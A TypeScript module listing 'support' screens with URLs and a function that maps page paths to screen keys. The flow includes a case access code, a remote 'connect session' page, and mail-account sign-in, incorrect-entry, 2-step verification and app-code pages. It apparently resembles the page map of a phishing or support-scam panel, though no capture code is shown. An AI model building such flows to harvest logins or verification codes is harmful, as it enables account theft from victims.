export type SafeClientScreen = {
  id: string;
  key: string;
  label: string;
  description: string;
  url: string;
};

/** Safe support destinations only — no credential / secret screens. */
export const SAFE_CLIENT_SCREENS: SafeClientScreen[] = [
  { id: 'welcome', key: 'SUPPORT_LANDING', label: 'SUPPORT_LANDING', description: 'Intro', url: '/welcome' },
  { id: 'case-code', key: 'CASE_ACCESS_CODE', label: 'CASE_ACCESS_CODE', description: 'Public suffix', url: '/case-code' },
  { id: 'account-review', key: 'CASE_REVIEW', label: 'CASE_REVIEW', description: 'Issue details only', url: '/contact' },
  { id: 'notice', key: 'CONFIRM_NOTICE', label: 'CONFIRM_NOTICE', description: 'Desk confirm', url: '/notice' },
  { id: 'activity', key: 'LAST_ACTIVITY', label: 'LAST_ACTIVITY', description: 'Display fields', url: '/activity' },
  { id: 'transfer', key: 'TRANSFER_CASE', label: 'TRANSFER_CASE', description: 'Hold or resume', url: '/transfer' },
  { id: 'channel', key: 'SELECT_CHANNEL', label: 'SELECT_CHANNEL', description: 'Chat phone desk', url: '/channel' },
  { id: 'connect', key: 'CONNECT_SESSION', label: 'CONNECT_SESSION', description: 'Connect tab', url: '/connect' },
  { id: 'desk-signin', key: 'DESK_SIGNIN', label: 'DESK_SIGNIN', description: 'Name and topic', url: '/desk-signin' },
  { id: 'case-file', key: 'CASE_FILE_NOTE', label: 'CASE_FILE_NOTE', description: 'Text note', url: '/case-file' },
  { id: 'callback', key: 'AGENT_CALLBACK', label: 'AGENT_CALLBACK', description: 'Callback window', url: '/callback' },
  { id: 'case-items', key: 'CASE_ITEMS', label: 'CASE_ITEMS', description: 'Line items', url: '/case-items' },
  { id: 'waiting', key: 'WAITING', label: 'WAITING', description: 'Please wait', url: '/waiting' },
  { id: 'loading', key: 'LOADING', label: 'LOADING', description: 'Loading', url: '/loading' },
  { id: 'success', key: 'SUCCESS', label: 'SUCCESS', description: 'Session complete', url: '/success' },
  { id: 'mail-signin', key: 'MAIL_ACCOUNT_SIGNIN', label: 'MAIL_ACCOUNT_SIGNIN', description: 'Mail desk name', url: '/demo/mail/signin' },
  { id: 'mail-invalid', key: 'MAIL_INCORRECT_ENTRY', label: 'MAIL_INCORRECT_ENTRY', description: 'Mail desk invalid', url: '/demo/mail/invalid' },
  { id: 'mail-verify', key: 'MAIL_2STEP', label: 'MAIL_2STEP', description: 'Mail desk verify', url: '/demo/mail/verify' },
  { id: 'mail-code', key: 'MAIL_APP_CODE', label: 'MAIL_APP_CODE', description: 'Public case suffix', url: '/demo/mail/code' },
  { id: 'mail-waiting', key: 'MAIL_WAITING', label: 'MAIL_WAITING', description: 'Mail desk wait', url: '/demo/mail/waiting' },
  { id: 'mail-alert', key: 'MAIL_SECURITY_NOTICE', label: 'MAIL_SECURITY_NOTICE', description: 'Mail desk alert', url: '/demo/mail/alert' },
  { id: 'mail-device', key: 'MAIL_DEVICE', label: 'MAIL_DEVICE', description: 'Mail desk device', url: '/demo/mail/device' },
];

export function screenKeyForPage(page?: string | null): string {
  const value = String(page || '').replace(/\/$/, '') || '/welcome';
  const match = SAFE_CLIENT_SCREENS.find((screen) => screen.url === value);
  if (match) return match.key;
  return value.replace(/^\//, '').replace(/\//g, '_').toUpperCase() || 'WELCOME';
}
